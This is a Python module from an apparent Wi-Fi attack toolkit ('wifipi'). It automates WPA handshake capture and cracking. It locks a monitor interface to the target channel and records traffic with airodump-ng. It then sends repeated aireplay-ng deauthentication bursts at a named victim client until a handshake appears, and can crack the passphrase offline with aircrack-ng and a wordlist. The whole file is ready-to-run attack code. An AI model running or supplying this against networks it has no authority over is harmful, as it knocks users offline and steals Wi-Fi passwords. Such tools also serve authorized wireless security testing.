"""attack/handshake — one-adapter handshake capture + optional offline crack.

Orchestrates:
  iw set channel -> airodump-ng (bg) -> wait for capture file ->
  loop(aireplay deauth burst -> poll aircrack-ng for handshake) until found
  -> optional aircrack-ng with wordlist.
"""

from __future__ import annotations

import subprocess
import time
from pathlib import Path

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec
from wifipi.procutil import popen as procutil_popen, run as run_proc, terminate


class Handshake(Module):
    NAME = "attack/handshake"
    CATEGORY = "attack"
    DESCRIPTION = "Capture WPA handshake on MON_IFACE; optional offline crack."
    OPTIONS = {
        "BSSID":    OptionSpec(required=True,  description="Target AP BSSID.", kind="bssid"),
        "CLIENT":   OptionSpec(required=True,  description="Victim MAC.", kind="mac"),
        "CHANNEL":  OptionSpec(required=True,  description="AP channel.", kind="int"),
        "TIMEOUT":  OptionSpec(required=False, default="60",
                               description="Give up after N seconds.", kind="int"),
        "WORDLIST": OptionSpec(required=False, default=None,
                               description="If set, auto-crack with this wordlist.", kind="path"),
    }
    REQUIRES_TOOLS = ["airodump-ng", "aireplay-ng", "aircrack-ng", "iw"]
    BLOCKING = True
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "handshakes"

    def run(self, ctx: RunContext) -> int:
        iface = ctx.options.get("MON_IFACE")
        if not iface:
            print("[x] MON_IFACE not set")
            return 2
        bssid = ctx.options["BSSID"]
        client = ctx.options["CLIENT"]
        channel = str(ctx.options["CHANNEL"])
        timeout = int(ctx.options.get("TIMEOUT", 60))
        wordlist = ctx.options.get("WORDLIST")

        prefix = ctx.loot_dir / "handshake"
        capfile = Path(str(prefix) + "-01.cap")

        run_proc(["iw", "dev", iface, "set", "channel", channel])

        airodump = procutil_popen(
            ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", str(prefix), iface],
            log_path=ctx.loot_dir / "airodump.log",
        )

        try:
            print(f"[*] waiting for {capfile.name}...")
            for _ in range(15):
                if capfile.exists():
                    break
                time.sleep(1)
            if not capfile.exists():
                print("[x] airodump didn't create capture (channel/BSSID wrong?)")
                return 3

            deadline = time.time() + timeout
            round_ = 0
            while time.time() < deadline:
                round_ += 1
                print(f"[*] round {round_} — deauth burst (5 frames)")
                run_proc(
                    ["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client, iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    check=False,
                )
                for _ in range(5):
                    time.sleep(1)
                    if self._has_handshake(capfile, bssid):
                        print(f"[+] handshake captured in {capfile} (after {round_} rounds)")
                        if wordlist:
                            return self._crack(wordlist, bssid, capfile, ctx)
                        return 0
            print(f"[x] no handshake after {timeout}s")
            return 4
        finally:
            terminate(airodump)

    def _has_handshake(self, capfile: Path, bssid: str) -> bool:
        res = run_proc(
            ["aircrack-ng", "-b", bssid, str(capfile)],
            capture_output=True, text=True, stdin=subprocess.DEVNULL, check=False,
        )
        return "1 handshake" in res.stdout

    def _crack(self, wordlist: str, bssid: str, capfile: Path, ctx: RunContext) -> int:
        wl = Path(wordlist)
        if not wl.is_file():
            print(f"[x] wordlist not readable: {wordlist}")
            return 5
        print(f"[*] offline crack with {wl}")
        with (ctx.loot_dir / "aircrack.log").open("ab") as fh:
            return run_proc(
                ["aircrack-ng", "-w", str(wl), "-b", bssid, str(capfile)],
                stdout=fh, stderr=fh,
            ).returncode
